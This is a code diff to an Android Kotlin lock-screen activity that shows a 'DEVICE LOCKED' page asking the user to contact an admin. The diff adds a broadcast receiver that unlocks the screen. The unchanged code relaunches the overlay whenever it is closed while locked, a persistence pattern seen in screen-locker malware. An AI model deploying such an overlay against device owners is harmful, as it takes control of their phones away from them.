@@ -2,8 +2,11 @@ package com.example.malzguard
 
 import android.app.Activity
 import android.app.ActivityManager
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.os.Build
 import android.os.Bundle
 import android.view.WindowManager
 import android.webkit.JavascriptInterface
@@ -13,6 +16,7 @@ import android.widget.FrameLayout
 
 class LockOverlay : Activity() {
     private var locked = true
+    private var receiver: BroadcastReceiver? = null
 
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
@@ -36,6 +40,25 @@ class LockOverlay : Activity() {
             web.addJavascriptInterface(Bridge(), "Native")
             val html = intent.getStringExtra("html") ?: DEFAULT_HTML
             web.loadDataWithBaseURL(null, wrapHtml(html), "text/html", "utf-8", null)
+
+            receiver = object : BroadcastReceiver() {
+                override fun onReceive(c: Context?, i: Intent?) {
+                    if (i?.action == ACTION_UNLOCK) {
+                        try { stopLockTask() } catch (e: Exception) {}
+                        locked = false
+                        finish()
+                    }
+                }
+            }
+            try {
+                if (Build.VERSION.SDK_INT >= 33) {
+                    registerReceiver(receiver, IntentFilter(ACTION_UNLOCK), Context.RECEIVER_NOT_EXPORTED)
+                } else {
+                    registerReceiver(receiver, IntentFilter(ACTION_UNLOCK))
+                }
+            } catch (e: Exception) {
+                try { registerReceiver(receiver, IntentFilter(ACTION_UNLOCK)) } catch (e2: Exception) {}
+            }
         } catch (e: Exception) { finish() }
     }
 
@@ -70,10 +93,12 @@ p{font-size:13px;color:#888;letter-spacing:2px;line-height:1.8}
     }
     override fun onDestroy() {
         if (locked) { try { val i = Intent(this, LockOverlay::class.java); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP); i.putExtra("html", intent.getStringExtra("html")); startActivity(i) } catch (e: Exception) {} }
+        try { receiver?.let { unregisterReceiver(it) } } catch (e: Exception) {}
         super.onDestroy()
     }
 
     companion object {
+        const val ACTION_UNLOCK = "com.example.malzguard.UNLOCK"
         const val DEFAULT_HTML = """<div class="lock-icon">🔒</div><h1>DEVICE LOCKED</h1><p>Hubungi admin untuk unlock.</p>"""
     }
 }
